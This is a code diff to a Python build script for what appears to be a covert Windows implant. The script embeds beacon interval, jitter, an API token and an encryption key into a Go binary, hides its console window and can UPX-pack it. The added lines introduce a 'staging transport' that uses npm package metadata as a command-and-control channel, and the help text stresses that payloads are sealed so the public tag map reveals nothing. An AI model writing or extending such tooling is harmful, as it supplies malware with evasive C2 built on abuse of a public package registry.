@@ -70,7 +70,7 @@ def pack_upx(path):
 
 def build(token=None, package=None, api_base=None, arch_key="amd64",
           outdir=None, name="node", strip=True, interval=60, jitter=20,
-          upx=False, tag_value="1.0.0", passphrase=None):
+          upx=False, tag_value="1.0.0", passphrase=None, stage_chan=None):
     if token and not package:
         raise SystemExit("--package is required with --token")
     if passphrase and not package:
@@ -104,6 +104,8 @@ def build(token=None, package=None, api_base=None, arch_key="amd64",
         "-X", f"main.embeddedJit={int(jitter)}",
         "-X", f"main.tagValue={tag_value}",
         "-X", f"main.embeddedKey={emb_key}",
+        "-X", f"main.embeddedStageChan={stage_chan or ''}",
+        "-X", f"main.embeddedStageMode={1 if stage_chan else 0}",
         "-H", "windowsgui",
     ]
     if strip:
@@ -149,6 +151,10 @@ def main():
     ap.add_argument("--tag-value", default="1.0.0",
                     help="version the dist-tags point at; must exist in the "
                          "package (staged-first packages use 0.0.0-stage)")
+    ap.add_argument("--stage-chan", default=None,
+                    help="use the staging transport with this 4-char channel "
+                         "id instead of dist-tags (the only write path npm "
+                         "still allows automation)")
     ap.add_argument("--passphrase", default=None,
                     help="channel passphrase: seals every payload with "
                          "AES-256-GCM so the public tag map reveals nothing")
@@ -161,11 +167,13 @@ def main():
         raise SystemExit("--package/-p is required: the binary carries it")
     build(a.token, a.package, a.api_base, "amd64", a.outdir, a.name,
           strip=not a.no_strip, interval=a.interval, jitter=a.jitter, upx=a.upx,
-          tag_value=a.tag_value, passphrase=a.passphrase)
+          tag_value=a.tag_value, passphrase=a.passphrase,
+          stage_chan=a.stage_chan)
     if a.x86:
         build(a.token, a.package, a.api_base, "386", a.outdir, a.name,
               strip=not a.no_strip, interval=a.interval, jitter=a.jitter,
-              upx=a.upx, tag_value=a.tag_value, passphrase=a.passphrase)
+              upx=a.upx, tag_value=a.tag_value, passphrase=a.passphrase,
+              stage_chan=a.stage_chan)
 
 
 if __name__ == "__main__":
